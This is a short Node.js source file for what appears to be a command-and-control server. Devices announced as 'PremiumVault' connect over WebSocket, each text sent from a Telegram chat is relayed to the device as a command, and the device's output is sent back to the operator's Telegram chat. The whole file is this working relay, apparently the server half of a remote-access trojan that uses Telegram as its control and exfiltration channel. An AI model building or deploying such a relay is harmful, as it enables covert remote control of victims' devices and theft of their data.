const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');

// ⚠️ REPLACE THESE WITH YOUR ACTUAL TELEGRAM DETAILS
const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';
const PORT = process.env.PORT || 8080;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const wss = new WebSocket.Server({ port: PORT });

let activeSocket = null;

wss.on('connection', (ws) => {
    activeSocket = ws;
    bot.sendMessage(CHAT_ID, '🟢 PremiumVault: New device connected!');
    
    ws.on('message', (message) => {
        bot.sendMessage(CHAT_ID, `📱 Output:\n\`\`\`\n${message}\n\`\`\``, { parse_mode: 'Markdown' });
    });
});

bot.on('message', (msg) => {
    if (msg.text && activeSocket && activeSocket.readyState === WebSocket.OPEN) {
        activeSocket.send(msg.text);
    } else if (!activeSocket) {
        bot.sendMessage(CHAT_ID, '❌ No device connected.');
    }
});

console.log(`Server running on port ${PORT}`);
